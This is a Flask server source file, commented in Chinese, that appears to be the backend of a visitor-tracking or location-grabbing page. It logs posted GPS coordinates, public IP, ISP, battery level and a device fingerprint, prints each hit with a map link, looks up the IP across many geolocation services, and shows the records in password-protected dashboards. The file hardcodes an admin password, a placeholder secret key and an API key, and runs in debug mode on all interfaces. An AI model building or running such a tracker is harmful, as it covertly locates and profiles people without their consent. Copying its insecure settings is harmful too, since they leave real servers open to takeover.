from flask import Flask, render_template, jsonify, request, session, redirect, url_for
import logging
import platform
import socket
import requests
from datetime import datetime
import math
import re
import json
import os

# WGS-84转GCJ-02坐标转换函数
def wgs84_to_gcj02(lng, lat):
    """将WGS-84坐标转换为GCJ-02坐标"""
    PI = math.pi
    a = 6378137.0
    ee = 0.00669342162296594323
    
    if out_of_china(lng, lat):
        return lng, lat
    
    d_lat = transform_lat(lng - 105.0, lat - 35.0)
    d_lng = transform_lng(lng - 105.0, lat - 35.0)
    rad_lat = lat / 180.0 * PI
    magic = math.sin(rad_lat)
    magic = 1 - ee * magic * magic
    sqrt_magic = math.sqrt(magic)
    d_lat = (d_lat * 180.0) / ((a * (1 - ee)) / (magic * sqrt_magic) * PI)
    d_lng = (d_lng * 180.0) / (a / sqrt_magic * math.cos(rad_lat) * PI)
    
    gcj_lat = lat + d_lat
    gcj_lng = lng + d_lng
    
    return gcj_lng, gcj_lat

def transform_lat(x, y):
    """计算纬度偏移量"""
    PI = math.pi
    ret = -100.0 + 2.0 * x + 3.0 * y + 0.2 * y * y + 0.1 * x * y + 0.2 * math.sqrt(abs(x))
    ret += (20.0 * math.sin(6.0 * x * PI) + 20.0 * math.sin(2.0 * x * PI)) * 2.0 / 3.0
    ret += (20.0 * math.sin(y * PI) + 40.0 * math.sin(y / 3.0 * PI)) * 2.0 / 3.0
    ret += (160.0 * math.sin(y / 12.0 * PI) + 320 * math.sin(y * PI / 30.0)) * 2.0 / 3.0
    return ret

def transform_lng(x, y):
    """计算经度偏移量"""
    PI = math.pi
    ret = 300.0 + x + 2.0 * y + 0.1 * x * x + 0.1 * x * y + 0.1 * math.sqrt(abs(x))
    ret += (20.0 * math.sin(6.0 * x * PI) + 20.0 * math.sin(2.0 * x * PI)) * 2.0 / 3.0
    ret += (20.0 * math.sin(x * PI) + 40.0 * math.sin(x / 3.0 * PI)) * 2.0 / 3.0
    ret += (150.0 * math.sin(x / 12.0 * PI) + 300.0 * math.sin(x / 30.0 * PI)) * 2.0 / 3.0
    return ret

def out_of_china(lng, lat):
    """判断坐标是否在国外"""
    return (lng < 72.004 or lng > 137.8347) or (lat < 0.8293 or lat > 55.8271)

app = Flask(__name__)

# 配置应用
app.secret_key = 'your-secret-key-here'  # 用于session管理
ADMIN_PASSWORD = 'Pzf75513'  # 管理员密码
LOG_FILE = 'device_info.json'  # JSON格式日志文件

# 科技感后台配置
TECH_ADMIN_PASSWORD = os.environ.get('TECH_BACKEND_PASSWORD', 'Pzf75513')  # 从环境变量获取密码，默认Pzf75513
BACKEND_TYPE = os.environ.get('BACKEND_TYPE', 'normal')  # 后台类型：normal或tech

# 配置日志
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(message)s',
    handlers=[
        logging.FileHandler('device_info.log', encoding='utf-8'),  # 添加UTF-8编码
        logging.StreamHandler()
    ]
)
logger = logging.getLogger(__name__)

# 设置Werkzeug日志级别为INFO，显示请求日志
werkzeug_logger = logging.getLogger('werkzeug')
werkzeug_logger.setLevel(logging.INFO)

@app.route('/api/ip-info')
def get_ip_info():
    def get_ip_details(ip):
        """获取IP详情的备选方案，使用更可靠的IP地理信息服务"""
        # 添加更多可靠的IP地理信息服务，按可靠性排序
        details_services = [
            # 使用国内更可靠的IP查询服务
            f'https://whois.pconline.com.cn/ipJson.jsp?ip={ip}&json=true',  # 太平洋网络IP查询
            f'https://api.vore.top/api/IPdata?ip={ip}',  # 国内IP查询API
            f'https://ip.useragentinfo.com/json?ip={ip}',  # 国内IP查询服务
            f'https://api.ipwhois.cn/?ip={ip}&json=true',  # 国内IPWHOIS查询服务
            f'https://ip-api.com/json/{ip}?lang=zh-CN',  # 国际IP查询API，支持中文
            # 国际IP查询服务
            f'https://ipinfo.io/{ip}/json',  # 已经在使用
            f'https://ipapi.co/{ip}/json/',  # 已经在使用
            f'https://api.ipgeolocation.io/ipgeo?apiKey=32bcd4a6e4b548968e7afcdb682ac679&ip={ip}',  # 免费API
            f'https://freeipapi.com/api/json/{ip}',  # 免费IP查询API
            f'https://api.my-ip.io/v2/ip.json?ip={ip}',  # 已经在使用
            f'https://api.db-ip.com/v2/free/{ip}'  # DB-IP免费IP查询API
        ]
        
        for service in details_services:
            try:
                # 发送请求，增加超时时间到5秒
                response = requests.get(service, timeout=5)
                response.raise_for_status()  # 检查请求是否成功
                
                # 尝试解析JSON响应
                data = response.json()
                
                # 处理不同API返回的数据格式
                if service.startswith('https://whois.pconline.com.cn'):
                    # 太平洋网络IP查询结果处理
                    if data and isinstance(data, dict):
                        return {
                            'ip': ip,
                            'country': '中国' if data.get('pro') else 'N/A',
                            'region': data.get('pro', 'N/A'),
                            'city': data.get('city', 'N/A'),
                            'loc': f"{data.get('lat', 'N/A')},{data.get('lng', 'N/A')}",
                            'timezone': data.get('timezone', 'N/A'),
                            'isp': data.get('isp', 'N/A')
                        }
                elif service.startswith('https://api.vore.top'):
                    # 国内IP查询API结果处理
                    result = data.get('result', {})
                    if result == 200:  # 检查API是否返回成功
                        data = data.get('data', {})
                        if data and isinstance(data, dict):
                            return {
                                'ip': ip,
                                'country': data.get('country', 'N/A'),
                                'region': data.get('province', 'N/A'),
                                'city': data.get('city', 'N/A'),
                                'loc': f"{data.get('lat', 'N/A')},{data.get('lng', 'N/A')}",
                                'timezone': data.get('timezone', 'N/A'),
                                'isp': data.get('isp', 'N/A')
                            }
                elif service.startswith('https://ip.useragentinfo.com'):
                    # 国内IP查询服务结果处理
                    status = data.get('code', 0)
                    if status == 200:  # 检查API是否返回成功
                        data = data.get('data', {})
                        if data and isinstance(data, dict):
                            return {
                                'ip': ip,
                                'country': data.get('country', 'N/A'),
                                'region': data.get('region', 'N/A'),
                                'city': data.get('city', 'N/A'),
                                'loc': f"{data.get('lat', 'N/A')},{data.get('lng', 'N/A')}",
                                'timezone': data.get('timezone', 'N/A'),
                                'isp': data.get('isp', 'N/A')
                            }
                elif service.startswith('https://api.ipwhois.cn'):
                    # 国内IPWHOIS查询服务结果处理
                    if data and isinstance(data, dict) and data.get('ret') == 'ok':
                        return {
                            'ip': ip,
                            'country': data.get('country', 'N/A'),
                            'region': data.get('province', 'N/A'),
                            'city': data.get('city', 'N/A'),
                            'loc': f"{data.get('lat', 'N/A')},{data.get('lng', 'N/A')}",
                            'timezone': data.get('timezone', 'N/A'),
                            'isp': data.get('isp', 'N/A')
                        }
                elif service.startswith('https://ip-api.com'):
                    # IP-API查询结果处理
                    if data and isinstance(data, dict) and data.get('status') == 'success':
                        return {
                            'ip': ip,
                            'country': data.get('country', 'N/A'),
                            'region': data.get('regionName', 'N/A'),
                            'city': data.get('city', 'N/A'),
                            'loc': f"{data.get('lat', 'N/A')},{data.get('lon', 'N/A')}",
                            'timezone': data.get('timezone', 'N/A'),
                            'isp': data.get('isp', 'N/A')
                        }
                elif service.startswith('https://api.ipgeolocation.io'):
                    # ipgeolocation.io结果处理
                    if data and isinstance(data, dict):
                        return {
                            'ip': ip,
                            'country': data.get('country_name', 'N/A'),
                            'region': data.get('state_prov', 'N/A'),
                            'city': data.get('city', 'N/A'),
                            'loc': f"{data.get('latitude', 'N/A')},{data.get('longitude', 'N/A')}",
                            'timezone': data.get('time_zone', {}).get('name', 'N/A'),
                            'isp': data.get('isp', 'N/A')
                        }
                elif service.startswith('https://freeipapi.com'):
                    # freeipapi.com结果处理
                    if data and isinstance(data, dict):
                        return {
                            'ip': ip,
                            'country': data.get('countryName', 'N/A'),
                            'region': data.get('regionName', 'N/A'),
                            'city': data.get('cityName', 'N/A'),
                            'loc': f"{data.get('latitude', 'N/A')},{data.get('longitude', 'N/A')}",
                            'timezone': data.get('timeZone', 'N/A'),
                            'isp': data.get('isp', 'N/A')
                        }
                elif service.startswith('https://api.db-ip.com'):
                    # DB-IP免费IP查询API结果处理
                    if data and isinstance(data, dict):
                        return {
                            'ip': ip,
                            'country': data.get('countryName', 'N/A'),
                            'region': data.get('stateProv', 'N/A'),
                            'city': data.get('city', 'N/A'),
                            'loc': f"{data.get('latitude', 'N/A')},{data.get('longitude', 'N/A')}",
                            'timezone': data.get('timeZone', 'N/A'),
                            'isp': data.get('isp', 'N/A')
                        }
                elif service.startswith('https://ipinfo.io') or service.startswith('https://ipapi.co'):
                    # 其他国际IP查询服务结果处理
                    if data and isinstance(data, dict):
                        return data
                else:
                    # 其他API结果处理
                    if data and isinstance(data, dict):
                        return data
                
                # 如果当前服务的响应格式不符合预期，继续尝试下一个服务
                continue
            except requests.RequestException as e:
                # 记录请求异常，但不中断循环
                logger.debug(f"IP service {service} failed: {e}")
                continue
            except ValueError as e:
                # 记录JSON解析异常，但不中断循环
                logger.debug(f"JSON parsing failed for {service}: {e}")
                continue
            except Exception as e:
                # 记录其他异常，但不中断循环
                logger.debug(f"Unexpected error for {service}: {e}")
                continue
        return {}
    
    try:
        # 获取请求者的真实IP
        # 优先检查X-Forwarded-For等代理头
        real_ip = request.headers.get('X-Forwarded-For', '').split(',')[0].strip() or \
                 request.headers.get('X-Real-IP', '').strip() or \
                 request.remote_addr
        
        # 获取IP详情
        ip_data = get_ip_details(real_ip)
        
        # 构建返回结果
        result = {
            'public_ip': real_ip,
            'country': ip_data.get('country', 'N/A'),
            'region': ip_data.get('region', 'N/A'),
            'city': ip_data.get('city', 'N/A'),
            'loc': ip_data.get('loc', 'N/A'),
            'timezone': ip_data.get('timezone', 'N/A'),
            'isp': ip_data.get('org', ip_data.get('isp', 'N/A'))
        }
        
        return jsonify(result)
    except Exception as e:
        logger.error(f"Error getting IP info: {e}")
        # 即使IP获取失败，也返回可用的信息
        return jsonify({
            'public_ip': request.remote_addr,  # 至少返回本地IP
            'country': 'N/A',
            'region': 'N/A',
            'city': 'N/A',
            'loc': 'N/A',
            'timezone': 'N/A',
            'isp': 'N/A'
        })

# 辅助函数：保存日志到JSON文件
def save_log_to_json(log_data):
    """将日志数据保存到JSON文件"""
    logs = []
    
    # 读取现有日志
    if os.path.exists(LOG_FILE):
        try:
            with open(LOG_FILE, 'r', encoding='utf-8') as f:
                logs = json.load(f)
        except:
            logs = []
    
    # 添加新日志
    logs.append(log_data)
    
    # 保存更新后的日志
    try:
        with open(LOG_FILE, 'w', encoding='utf-8') as f:
            json.dump(logs, f, ensure_ascii=False, indent=2)
        return True
    except Exception as e:
        logger.error(f"保存日志到JSON文件失败: {e}")
        return False

# 辅助函数：读取JSON日志
def read_logs_from_json():
    """从JSON文件读取日志"""
    logs = []
    
    if os.path.exists(LOG_FILE):
        try:
            with open(LOG_FILE, 'r', encoding='utf-8') as f:
                logs = json.load(f)
        except Exception as e:
            logger.error(f"读取JSON日志文件失败: {e}")
            logs = []
    
    # 按时间倒序排列
    logs.sort(key=lambda x: x.get('timestamp', ''), reverse=True)
    
    return logs

@app.route('/api/save-log', methods=['POST'])
def save_log():
    try:
        data = request.json
        timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        
        # 极简终端输出格式
        lat = data.get('latitude', 'N/A')
        lng = data.get('longitude', 'N/A')
        public_ip = data.get('public_ip', 'N/A')
        
        # 生成高德地图链接（经纬度有效时）
        amap_url = "#"
        if lat != 'N/A' and lng != 'N/A':
            try:
                # 将WGS-84坐标转换为GCJ-02坐标（高德地图使用的坐标系）
                wgs_lng = float(lng)
                wgs_lat = float(lat)
                gcj_lng, gcj_lat = wgs84_to_gcj02(wgs_lng, wgs_lat)
                amap_url = f"https://uri.amap.com/marker?position={gcj_lng:.6f},{gcj_lat:.6f}&name=当前位置&coordinate=gaode"
            except:
                # 转换失败时使用原始坐标
                amap_url = f"https://uri.amap.com/marker?position={lng},{lat}&name=当前位置&coordinate=gaode"
        
        # 简化输出，只包含时间、IP、经纬度和高德地图链接
        print("\n" + "="*50)
        print(f"[+] 获取时间  : {timestamp}")
        print(f"[+] 公网IP    : {public_ip}")
        print(f"[+] 经纬度    : {lat}, {lng}")
        print(f"[+] 高德地图  : {amap_url}")
        print(f"[+] 设备类型  : {data.get('deviceType', 'N/A')}")
        print(f"[+] 浏览器    : {data.get('browser', 'N/A')[:50]}...")
        print(f"[+] 操作系统  : {data.get('os', 'N/A')}")
        print("="*50 + "\n")
        
        # 构建日志条目
        log_entry = {
            'timestamp': timestamp,
            'os': data.get('os', 'N/A'),
            'platform': data.get('platform', 'N/A'),
            'cpuCores': data.get('cpuCores', 'N/A'),
            'deviceMemory': data.get('deviceMemory', 'N/A'),
            'gpuVendor': data.get('gpuVendor', 'N/A'),
            'gpu': data.get('gpu', 'N/A'),
            'resolution': data.get('resolution', 'N/A'),
            'viewport': data.get('viewport', 'N/A'),
            'browser': data.get('browser', 'N/A'),
            'public_ip': data.get('public_ip', 'N/A'),
            'city': data.get('city', 'N/A'),
            'region': data.get('region', 'N/A'),
            'country': data.get('country', 'N/A'),
            'latitude': data.get('latitude', 'N/A'),
            'longitude': data.get('longitude', 'N/A'),
            'geolocationAccuracy': data.get('geolocationAccuracy', 'N/A'),
            'isp': data.get('isp', 'N/A'),
            'timezone': data.get('timezone', 'N/A'),
            'colorDepth': data.get('colorDepth', 'N/A'),
            'pixelRatio': data.get('pixelRatio', 'N/A'),
            'language': data.get('language', 'N/A'),
            'languagePreferences': data.get('languagePreferences', 'N/A'),
            'deviceType': data.get('deviceType', 'N/A'),
            'online': data.get('online', 'N/A'),
            'cookieEnabled': data.get('cookieEnabled', 'N/A'),
            'touchSupport': data.get('touchSupport', 'N/A'),
            'maxTouchPoints': data.get('maxTouchPoints', 'N/A'),
            'batteryLevel': data.get('batteryLevel', 'N/A'),
            'charging': data.get('charging', 'N/A'),
            'localStorage': data.get('localStorage', 'N/A'),
            'sessionStorage': data.get('sessionStorage', 'N/A')
        }
        
        # 保存到JSON文件
        save_log_to_json(log_entry)
        
        # 同时记录到文本日志文件
        device_identifier = f"{log_entry['os']} - {log_entry['browser']} - {log_entry['public_ip']}"
        text_log = f"[{timestamp}] [{device_identifier}] "
        text_log += f"OS: {log_entry['os']}, "
        text_log += f"Platform: {log_entry['platform']}, "
        text_log += f"Public IP: {log_entry['public_ip']}, "
        text_log += f"Coords: {log_entry['latitude']}, {log_entry['longitude']}, "
        text_log += f"Device Type: {log_entry['deviceType']}"
        logger.info(text_log)
        
        return jsonify({'status': 'success'})
    except Exception as e:
        logger.error(f"Error saving log: {e}")
        return jsonify({'status': 'error'})

# 解析日志文件的函数
def parse_logs():
    """解析日志文件，返回处理后的日志条目列表"""
    logs = read_logs_from_json()
    processed_logs = []
    
    for log in logs:
        # 生成高德地图链接
        map_url = "#"
        lat = log.get('latitude', 'N/A')
        lng = log.get('longitude', 'N/A')
        
        if lat != 'N/A' and lng != 'N/A':
            try:
                wgs_lng = float(lng)
                wgs_lat = float(lat)
                gcj_lng, gcj_lat = wgs84_to_gcj02(wgs_lng, wgs_lat)
                map_url = f"https://uri.amap.com/marker?position={gcj_lng:.6f},{gcj_lat:.6f}&name=当前位置&coordinate=gaode"
            except:
                map_url = f"https://uri.amap.com/marker?position={lng},{lat}&name=当前位置&coordinate=gaode"
        
        # 构建处理后的日志条目
        processed_log = {
            'time': log.get('timestamp', 'N/A'),
            'ip': log.get('public_ip', 'N/A'),
            'lat': lat,
            'lng': lng,
            'map_url': map_url,
            'device_type': log.get('deviceType', 'N/A'),
            'browser': log.get('browser', 'N/A'),
            'os': log.get('os', 'N/A'),
            'platform': log.get('platform', 'N/A'),
            'cpu_cores': log.get('cpuCores', 'N/A'),
            'device_memory': log.get('deviceMemory', 'N/A'),
            'resolution': log.get('resolution', 'N/A'),
            'gpu': f"{log.get('gpuVendor', 'N/A')} {log.get('gpu', 'N/A')}",
            'country': log.get('country', 'N/A'),
            'region': log.get('region', 'N/A'),
            'city': log.get('city', 'N/A'),
            'isp': log.get('isp', 'N/A'),
            'timezone': log.get('timezone', 'N/A')
        }
        
        processed_logs.append(processed_log)
    
    return processed_logs

# 后台管理路由
@app.route('/admin', methods=['GET', 'POST'])
def admin():
    # 如果已登录，直接跳转到后台首页
    if 'admin_logged_in' in session and session['admin_logged_in']:
        return redirect(url_for('admin_home'))
    
    # 处理登录请求
    if request.method == 'POST':
        password = request.form.get('password')
        if password == ADMIN_PASSWORD:
            session['admin_logged_in'] = True
            return redirect(url_for('admin_home'))
        else:
            return render_template('admin_login.html', error='密码错误')
    
    # 显示登录页面
    return render_template('admin_login.html')

@app.route('/admin/home')
def admin_home():
    # 检查是否登录
    if 'admin_logged_in' not in session or not session['admin_logged_in']:
        return redirect(url_for('admin'))
    
    # 解析日志
    logs = parse_logs()
    
    # 统计信息
    total_logs = len(logs)
    unique_ips = len(set(log['ip'] for log in logs if log['ip'] != 'N/A'))
    today = datetime.now().strftime('%Y-%m-%d')
    today_logs = len([log for log in logs if log['time'].startswith(today)])
    
    return render_template('admin.html', logs=logs, total_logs=total_logs, unique_ips=unique_ips, today_logs=today_logs)

@app.route('/admin/logout')
def admin_logout():
    # 清除登录状态
    session.pop('admin_logged_in', None)
    return redirect(url_for('admin'))

# 根据后台类型决定根路径行为
@app.route('/', methods=['GET', 'POST'])
def index():
    """根据后台类型显示不同的首页"""
    if BACKEND_TYPE == 'tech':
        # 科技感后台：处理登录和显示后台
        # 如果已登录，直接显示科技感后台首页内容
        if 'tech_admin_logged_in' in session and session['tech_admin_logged_in']:
            # 解析日志
            logs = parse_logs()
            
            # 统计信息
            total_logs = len(logs)
            unique_ips = len(set(log['ip'] for log in logs if log['ip'] != 'N/A'))
            today = datetime.now().strftime('%Y-%m-%d')
            today_logs = len([log for log in logs if log['time'].startswith(today)])
            
            return render_template('tech_admin.html', logs=logs, total_logs=total_logs, unique_ips=unique_ips, today_logs=today_logs)
        
        # 处理登录请求
        if request.method == 'POST':
            password = request.form.get('password')
            if password == TECH_ADMIN_PASSWORD:
                session['tech_admin_logged_in'] = True
                # 登录成功后直接显示后台首页内容
                logs = parse_logs()
                
                # 统计信息
                total_logs = len(logs)
                unique_ips = len(set(log['ip'] for log in logs if log['ip'] != 'N/A'))
                today = datetime.now().strftime('%Y-%m-%d')
                today_logs = len([log for log in logs if log['time'].startswith(today)])
                
                return render_template('tech_admin.html', logs=logs, total_logs=total_logs, unique_ips=unique_ips, today_logs=today_logs)
            else:
                return render_template('tech_admin_login.html', error='密码错误')
        
        # 显示登录页面
        return render_template('tech_admin_login.html')
    else:
        # 普通后台：显示原有的index.html
        return render_template('index.html')

# 科技感后台的备用路由，保持兼容性
@app.route('/tech-admin', methods=['GET', 'POST'])
def tech_admin():
    """科技感后台登录页面（备用路由）"""
    return index()

@app.route('/tech-admin/api/logs')
def tech_admin_api_logs():
    """科技感后台日志API，用于实时刷新"""
    # 检查是否登录
    if 'tech_admin_logged_in' not in session or not session['tech_admin_logged_in']:
        return jsonify({'error': '未登录'}), 401
    
    # 解析日志
    logs = parse_logs()
    
    # 统计信息
    total_logs = len(logs)
    unique_ips = len(set(log['ip'] for log in logs if log['ip'] != 'N/A'))
    today = datetime.now().strftime('%Y-%m-%d')
    today_logs = len([log for log in logs if log['time'].startswith(today)])
    
    return jsonify({
        'logs': logs,
        'total_logs': total_logs,
        'unique_ips': unique_ips,
        'today_logs': today_logs
    })

@app.route('/tech-admin/logout')
def tech_admin_logout():
    """科技感后台登出"""
    # 清除登录状态
    session.pop('tech_admin_logged_in', None)
    return redirect(url_for('tech_admin'))

if __name__ == '__main__':
    import os
    port = int(os.environ.get('FLASK_RUN_PORT', 8001))
    app.run(host='0.0.0.0', port=port, debug=True)